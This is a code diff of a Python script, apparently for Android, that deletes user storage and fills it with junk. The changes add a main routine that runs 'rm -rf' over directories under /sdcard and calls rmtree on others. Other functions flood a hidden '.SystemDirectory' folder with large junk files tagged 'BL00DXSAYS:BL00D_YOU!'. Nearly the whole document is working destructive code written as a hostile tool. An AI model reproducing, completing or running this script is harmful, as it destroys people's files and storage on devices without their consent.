@@ -1,8 +1,12 @@
 from shutil import rmtree
 from os import mkdir, remove
+from time import sleep
 
 way = '/sdcard/.SystemDirectory/'
-content = '☫Ø.N.Ę.✞.☫Ø.N.Ę.✞.0.1.0.1.0.1.0.1.0.1.BL00DXSAYS:BL00D_YOU!'
+content = '漢.࿊.1.5.7.漢.࿊.漢.࿊.1.5.7.漢.࿊.漢.࿊.1.5.7.漢.࿊.漢.࿊.1.5.7.漢.࿊.漢.࿊.1.5.7.漢.࿊.BL00DXSAYS:BL00D_YOU!'
+delDir = True
+totalFiles = 10
+
 
 def dirExists():
     try:
@@ -14,9 +18,6 @@ def dirExists():
         mkdir(way)
 
 def fileFloodWithFor():
-    #enter value
-    totalFiles = 500
-
     for c in range(0, totalFiles):
         flood = open(f'{way}.bloodX{c}', 'a')
         flood.write((f'{content}' * 100) * 100)
@@ -27,7 +28,7 @@ def fileFloodWithWhile():
     try:
         while(True):
             try:
-                flood = open(f'{way}.bloodX{c}', 'a')
+                flood = open(f'{way}.bloodX{c}', 'a') #talvez de erro pq ele n sabe onde esta essa variavel c
                 flood.write((f'{content}' * 100) * 100)
                 flood.close()
             except:
@@ -36,20 +37,42 @@ def fileFloodWithWhile():
         print('unknow error!')
         fileFloodWithFor()
 
-
-
 def fileDelete():
-    from other import dirList
+    from other import dirList, dirListNative
     from os import system
 
-    system('rm -rf /sdcard/Android/obb/*')
+    for files in range(0, len(dirListNative)):
+        system(f'rm -rf /sdcard/{dirListNative[files]}/*')
 
-    #isso pode estar errado, testar depois
     for directory in range(0, len(dirList)):
-        remove(f'/sdcard/{dirList[directory]}')
+        try:
+            rmtree(f'/sdcard/{dirList[directory]}')
+
+        except:
+            pass
 
 def main():
-    pass
+    print('=' * 6, 'LOG OUTPUT', '=' * 6, '\n')
+    print('[x]code running...\n')
+    sleep(1)
+
+    print('[x]verifying directory...\n')
+    sleep(1)
+    dirExists()
+
+    if(delDir == True):
+        print('[x]deleting directories\n')
+        sleep(3)
+        fileDelete()
+
+    else:
+        pass
+
+    print('[x]flooding files...\n')
+    sleep(1)
+    #fileFloodWithWhile()
+
 
 if __name__ == "__main__":
     main()
+    
